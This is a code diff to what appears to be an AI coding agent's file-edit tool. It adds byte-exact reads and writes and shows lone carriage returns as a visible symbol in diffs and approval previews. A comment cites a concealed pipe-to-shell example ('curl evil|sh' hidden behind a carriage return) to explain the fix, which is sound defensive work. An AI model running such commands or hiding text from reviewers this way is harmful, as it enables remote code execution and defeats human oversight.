@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import difflib
 import logging
+import re
 from pathlib import Path
 from typing import Any
 
@@ -36,16 +37,26 @@ WINDOW_READ_CHARS = 20_000
 #: What ``diff`` prints after a last line that has no newline.
 NO_NEWLINE = "\\ No newline at end of file\n"
 
+#: A ``\r`` that does not end a CRLF line: a terminal or a card would let it
+#: hide the text before it (``# note\rcurl evil|sh``), so a byte-exact diff
+#: shows it as ``␍``.
+_LONE_CR = re.compile(r"\r(?!\n)")
 
-def unified_diff(path: str, before: str, after: str, *, created: bool = False) -> str:
+
+def unified_diff(
+    path: str, before: str, after: str, *, created: bool = False, show_cr: bool = False
+) -> str:
     """Unified diff between two versions of a file (empty when unchanged).
 
     A last line without a newline is followed by ``\\ No newline at end of
     file``, as ``diff`` and ``git`` write it, instead of running into the next
-    line.  ``created`` diffs a new file from ``/dev/null``.
+    line.  ``created`` diffs a new file from ``/dev/null``.  ``show_cr`` (a
+    byte-exact edit) writes every lone ``\\r`` as ``␍``.
     """
     if before == after and not created:
         return ""
+    if show_cr:
+        before, after = _LONE_CR.sub("␍", before), _LONE_CR.sub("␍", after)
     lines = []
     from snowpea_core.util.udiff import lines as split_lines
 
@@ -68,6 +79,20 @@ async def _read_existing(ctx: ToolContext, path: str) -> str | None:
         return await ctx.backend.read_file(path)
     except FileNotFoundError:
         return None
+
+
+async def _read_exact(backend: Any, path: str) -> str | None:
+    """The file as written: strict UTF-8, no newline translation, a BOM kept.
+
+    ``None`` when it does not exist; :class:`UnicodeDecodeError` when it is
+    not UTF-8.  A text read would turn every ``\\r\\n`` and lone ``\\r`` into
+    ``\\n``, and the write after it would change the whole file.
+    """
+    try:
+        data = await backend.read_bytes(path)
+    except FileNotFoundError:
+        return None
+    return data.decode("utf-8")
 
 
 async def _with_diagnostics(ctx: ToolContext, result: ToolResult) -> ToolResult:
@@ -285,7 +310,22 @@ async def _replace_in_file(ctx: ToolContext, args: dict[str, Any]) -> ToolResult
     new = str(args.get("new", ""))
     if not old:
         return ToolResult(ok=False, error="old is required and must not be empty")
-    before = await _read_existing(ctx, path)
+    # m28: an approved edit changes the matched bytes and nothing else — no
+    # CRLF or lone-\r normalisation anywhere in the file, no CRLF on Windows.
+    exact = bool(getattr(ctx, "exact", False))
+    if exact:
+        try:
+            before = await _read_exact(ctx.backend, path)
+        except UnicodeDecodeError:
+            return ToolResult(
+                ok=False,
+                error=(
+                    f"{path} is not valid UTF-8; an approved edit is applied byte-exactly "
+                    "and cannot change this file"
+                ),
+            )
+    else:
+        before = await _read_existing(ctx, path)
     if before is None:
         return ToolResult(ok=False, error=f"no such file: {path}")
     replace_all = bool(args.get("replaceAll", False))
@@ -293,12 +333,15 @@ async def _replace_in_file(ctx: ToolContext, args: dict[str, Any]) -> ToolResult
     if stale_is_owned(stale):
         return ToolResult(ok=False, error=file_state.refusal(stale or ""))
     after, occurrences, strategy, error = _replace_text(
-        path, before, old, new, replace_all, exact=getattr(ctx, "exact", False)
+        path, before, old, new, replace_all, exact=exact
     )
     if after is None:
         return ToolResult(ok=False, error=error)
     try:
-        await ctx.backend.write_file(path, after)
+        if exact:
+            await ctx.backend.write_bytes(path, after.encode("utf-8"))
+        else:
+            await ctx.backend.write_file(path, after)
     except OSError as exc:
         return ToolResult(ok=False, error=f"{type(exc).__name__}: {exc}")
     file_state.note_write(ctx.core, ctx.session, path, after)
@@ -316,7 +359,7 @@ async def _replace_in_file(ctx: ToolContext, args: dict[str, Any]) -> ToolResult
         ToolResult(
             ok=True,
             output=output,
-            diff=unified_diff(path, before, after) or None,
+            diff=unified_diff(path, before, after, show_cr=exact) or None,
             path=path,
         ),
     )
@@ -382,10 +425,9 @@ async def preview_diff(backend: Any, tool: str, args: dict[str, Any]) -> str | N
 
     async def current(path: str) -> str | None:
         if path not in contents:
-            try:
-                text = await backend.read_file(path)
-            except FileNotFoundError:
-                text = None
+            # The asked call runs byte-exact, so the card diffs the bytes; a
+            # file that is not UTF-8 raises and gets no preview.
+            text = await _read_exact(backend, path)
             if text is None:
                 return None
             contents[path] = originals[path] = text
@@ -435,7 +477,13 @@ async def preview_diff(backend: Any, tool: str, args: dict[str, Any]) -> str | N
         log.debug("could not preview %s", tool, exc_info=True)
         return None
     parts = (
-        unified_diff(path, originals.get(path) or "", text, created=path not in originals)
+        unified_diff(
+            path,
+            originals.get(path) or "",
+            text,
+            created=path not in originals,
+            show_cr=True,
+        )
         for path, text in contents.items()
     )
     diff = "\n".join(part for part in parts if part)
